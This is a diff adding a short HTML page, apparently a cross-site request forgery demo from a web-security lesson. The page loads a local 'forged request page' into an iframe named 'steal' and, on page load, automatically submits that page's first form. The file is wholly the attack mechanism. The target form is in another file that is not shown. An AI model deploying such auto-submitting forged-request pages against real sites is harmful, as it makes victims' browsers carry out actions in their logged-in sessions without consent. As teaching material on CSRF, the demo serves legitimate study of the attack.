@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script>
+        window.onload = function(){
+
+            var oIframe = document.querySelector('iframe');
+            console.log(window.frames['steal'].document.forms[0].submit())
+            window.frames['steal'].document.forms[0].submit();
+        }
+    </script>
+</head>
+<body>
+<iframe  name="steal"  src="./伪造请求页.html">
+</iframe>
+</body>
+</html>
